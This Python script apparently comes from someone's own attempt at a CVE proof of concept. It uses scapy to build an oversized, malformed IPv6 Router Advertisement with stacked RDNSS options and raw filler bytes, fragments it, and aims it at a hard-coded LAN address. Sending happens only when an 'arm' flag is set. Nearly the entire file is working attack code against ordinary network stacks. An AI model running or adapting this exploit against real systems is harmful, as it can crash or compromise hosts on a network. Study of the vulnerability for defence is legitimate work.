#!/usr/bin/python3
"""
orig e.dns
e.dns = [
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA" ]


My take on the CVE
"""

import sys
from scapy.all import *

def frag(l, arm = False):
    ## Frag out
    for p in range(len(l)):
        if arm is True:
            send(l[p])
        print(len(l[p]))

tgt = '192.168.10.241'
p_test_half = 'A'.encode()*8 + b"\x18\x30" + b"\xFF\x18"
p_test = p_test_half + 'A'.encode()*4


## Expanded flag options
c = ICMPv6NDOptEFA()

## Recursive DNS Server option
e = ICMPv6NDOptRDNSS()
e.len = 21
e.dns = [
"AAAA:AAAA:AAAA:AAA:AAA:AAA:AAA:A",
"AAAA:AAAA:AAAA:AAA:AAA:AAA:AAA:A",
"AAAA:AAAA:AAAA:AAA:AAA:AAA:AAA:A",
"AAAA:AAAA:AAAA:AAA:AAA:AAA:AAA:A",
"AAAA:AAAA:AAAA:AAA:AAA:AAA:AAA:A",
"AAAA:AAAA:AAAA:AAA:AAA:AAA:AAA:A",
"AAAA:AAAA:AAAA:AAA:AAA:AAA:AAA:A",
"AAAA:AAAA:AAAA:AAA:AAA:AAA:AAA:A",
"AAAA:AAAA:AAAA:AAA:AAA:AAA:AAA:A",
"AAAA:AAAA:AAAA:AAA:AAA:AAA:AAA:A" ]

      ## Router Advertisement / Recursive DNS Server option / Raw bytes
pkt = ICMPv6ND_RA() /\
      ICMPv6NDOptRDNSS(len=8) /\
      Raw(load='A'.encode()*16*2 + p_test_half + b"\x18\xa0"*6) / c / e / c / e / c / e / c / e / c / e / e / e / e / e / e / e

## Test fragement
p_test_frag = IPv6(dst = tgt, src = tgt, hlim = 255)/ \
              IPv6ExtHdrFragment()/pkt

## Frags
l = fragment6(p_test_frag, 200)

## Go
frag(l)
